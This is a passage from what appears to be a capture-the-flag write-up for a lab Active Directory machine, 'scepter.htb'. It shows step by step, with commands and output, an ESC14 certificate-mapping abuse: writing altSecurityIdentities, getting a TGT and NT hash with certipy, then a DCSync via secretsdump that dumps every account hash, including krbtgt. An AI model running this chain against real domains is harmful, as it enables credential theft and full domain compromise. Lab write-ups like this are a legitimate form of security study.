BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                               Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                               Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                   Mandatory group, Enabled by default, Enabled group
SCEPTER\CMS                                 Group            S-1-5-21-74879546-916818434-740295365-1601 Mandatory group, Enabled by default, Enabled group
SCEPTER\Protected Users                     Group            S-1-5-21-74879546-916818434-740295365-525  Mandatory group, Enabled by default, Enabled group
SCEPTER\Helpdesk Admins                     Group            S-1-5-21-74879546-916818434-740295365-1105 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization Certificate  Well-known group S-1-5-65-1                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

#### after a lot of habit hole I asked for help and they told me to use this:

- https://github.com/JonasBK/Powershell/blob/master/Get-WriteAltSecIDACEs.ps1


```
*Evil-WinRM* PS C:\Users\h.brown\Documents> Get-ADObject -Filter * -SearchBase "dc=scepter,dc=htb" | Get-WriteAltSecIDACEs


ObjectDN                : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
InheritedObjectTypeName : User
ObjectTypeName          : Alt-Security-Identities   <===========
ActiveDirectoryRights   : WriteProperty             <===========
InheritanceType         : All
ObjectType              : 00fbf30c-91fe-11d1-aebc-0000f80367c1
InheritedObjectType     : bf967aba-0de6-11d0-a285-00aa003049e2
ObjectFlags             : ObjectAceTypePresent, InheritedObjectAceTypePresent
AccessControlType       : Allow
IdentityReference       : SCEPTER\CMS    <==============
IsInherited             : True
InheritanceFlags        : ContainerInherit
PropagationFlags        : None
```

#### it appears that members of the CMS group have WriteProperty over the user p.adams on a specific object called Alt-Security-Identities. PowerView also reports this but does not specify.

```
*Evil-WinRM* PS C:\Users\h.brown\Documents> find-interestingdomainacl


ObjectDN                : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : 00fbf30c-91fe-11d1-aebc-0000f80367c1
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-74879546-916818434-740295365-1601
IdentityReferenceName   : CMS
IdentityReferenceDomain : scepter.htb
IdentityReferenceDN     : CN=CMS,CN=Users,DC=scepter,DC=htb
IdentityReferenceClass  : group

ObjectDN                : OU=Staff Access Certificate,DC=scepter,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-74879546-916818434-740295365-1104
IdentityReferenceName   : IT Support
IdentityReferenceDomain : scepter.htb
IdentityReferenceDN     : CN=IT Support,CN=Users,DC=scepter,DC=htb
IdentityReferenceClass  : group

ObjectDN                : OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : 00fbf30c-91fe-11d1-aebc-0000f80367c1
AceFlags                : ContainerInherit, InheritOnly
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-74879546-916818434-740295365-1601
IdentityReferenceName   : CMS
IdentityReferenceDomain : scepter.htb
IdentityReferenceDN     : CN=CMS,CN=Users,DC=scepter,DC=htb
IdentityReferenceClass  : group
```


## abusing ESC14 scenario 

- https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0
- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-a-write-access-on-altsecurityidentities


- get serial number of d.baker certificate impersonated h.brown

```
└─$ openssl x509 -in d.baker.pfx -noout -text                                                                                            
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            62:00:00:00:0c:cf:fc:58:f9:83:2f:28:56:00:00:00:00:00:0c
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=htb, DC=scepter, CN=scepter-DC01-CA
```


- We use the serial number and issuer distinguishedName from the certificate to obtain the X509IssuerSerialNumber mapping format 
- https://github.com/JonasBK/Powershell/blob/master/Get-X509IssuerSerialNumberFormat.ps1

```
└─PS> Get-X509IssuerSerialNumberFormat -serialnumber "620000000ccffc58f9832f285600000000000c" -IssuerDistinguishedName "CN=scepter-DC01-CA,DC=scepter,DC=htb"                                
X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>0c000000000056282f83f958fccf0c00000062
```

- We add the X509IssuerSerialNumber mapping to the altSecurityIdentities attribute of the target p.adams
- https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1

```
*Evil-WinRM* PS C:\Users\h.brown\Documents> Add-AltSecIDMapping -DistinguishedName "CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb" -MappingString "X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>0c000000000056282f83f958fccf0c00000062"
```

- We confirm that the DC did add the mapping
- https://github.com/JonasBK/Powershell/blob/master/Get-AltSecIDMapping.ps1
```
*Evil-WinRM* PS C:\Users\h.brown\Documents> Get-AltSecIDMapping -SearchBase "CN=Users,DC=scepter,DC=htb"

CN=h.brown,CN=Users,DC=scepter,DC=htb
X509:<RFC822>h.brown@scepter.htb
```


- We request a Kerberos TGT for the target
```
└─$ faketime -f +8hr certipy auth -pfx d.baker.pfx -username p.adams -dc-ip 10.10.11.65 -domain scepter.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'p.adams@scepter.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'p.adams.ccache'
[*] Wrote credential cache to 'p.adams.ccache'
[*] Trying to retrieve NT hash for 'p.adams'
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```


## p.adams creds

- p.adams has permissions to do DCSync

```
└─$ impacket-secretsdump scepter.htb/p.adams@10.10.11.65 -hashes :1b925c524f447bb821a8789c4b118ce0
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
scepter.htb\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::
scepter.htb\a.carter:1107:aad3b435b51404eeaad3b435b51404ee:2e24650b1e4f376fa574da438078d200:::
scepter.htb\h.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::
scepter.htb\p.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::
scepter.htb\e.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::
scepter.htb\o.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::
scepter.htb\M.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5
Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c
Administrator:des-cbc-md5:f79d45bf688aa238
krbtgt:aes256-cts-hmac-sha1-96:5d62c1b68af2bb009bb4875327edd5e4065ef2bf08e38c4ea0e609406d6279ee
krbtgt:aes128-cts-hmac-sha1-96:b9bc4dc299fe99a4e086bbf2110ad676
krbtgt:des-cbc-md5:57f8ef4f4c7f6245
scepter.htb\d.baker:aes256-cts-hmac-sha1-96:6adbc9de0cb3fb631434e513b1b282970fdc3ca089181991fb7036a05c6212fb
scepter.htb\d.baker:aes128-cts-hmac-sha1-96:eb3e28d1b99120b4f642419c99a7ac19
scepter.htb\d.baker:des-cbc-md5:2fce8a3426c8c2c1
scepter.htb\a.carter:aes256-cts-hmac-sha1-96:5a793dad7f782356cb6a741fe73ddd650ca054870f0c6d70fadcae162a389a71
scepter.htb\a.carter:aes128-cts-hmac-sha1-96:f7643849c000f5a7a6bd5c88c4724afd
scepter.htb\a.carter:des-cbc-md5:d607b098cb5e679b
scepter.htb\h.brown:aes256-cts-hmac-sha1-96:5779e2a207a7c94d20be1a105bed84e3b691a5f2890a7775d8f036741dadbc02
scepter.htb\h.brown:aes128-cts-hmac-sha1-96:1345228e68dce06f6109d4d64409007d
scepter.htb\h.brown:des-cbc-md5:6e6dd30151cb58c7
scepter.htb\p.adams:aes256-cts-hmac-sha1-96:0fa360ee62cb0e7ba851fce9fd982382c049ba3b6224cceb2abd2628c310c22f
scepter.htb\p.adams:aes128-cts-hmac-sha1-96:85462bdef70af52770b2260963e7b39f
scepter.htb\p.adams:des-cbc-md5:f7a26e794949fd61
scepter.htb\e.lewis:aes256-cts-hmac-sha1-96:1cfd55c20eadbaf4b8183c302a55c459a2235b88540ccd75419d430e049a4a2b
scepter.htb\e.lewis:aes128-cts-hmac-sha1-96:a8641db596e1d26b6a6943fc7a9e4bea
scepter.htb\e.lewis:des-cbc-md5:57e9291aad91fe7f
scepter.htb\o.scott:aes256-cts-hmac-sha1-96:4fe8037a8176334ebce849d546e826a1248c01e9da42bcbd13031b28ddf26f25
scepter.htb\o.scott:aes128-cts-hmac-sha1-96:37f1bd1cb49c4923da5fc82b347a25eb
scepter.htb\o.scott:des-cbc-md5:e329e37fda6e0df7
scepter.htb\M.clark:aes256-cts-hmac-sha1-96:a0890aa7efc9a1a14f67158292a18ff4ca139d674065e0e4417c90e5a878ebe0
scepter.htb\M.clark:aes128-cts-hmac-sha1-96:84993bbad33c139287239015be840598
scepter.htb\M.clark:des-cbc-md5:4c7f5dfbdcadba94
DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9feff0d6cce71e1
DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a
DC01$:des-cbc-md5:d6923e61a83d51ef
```
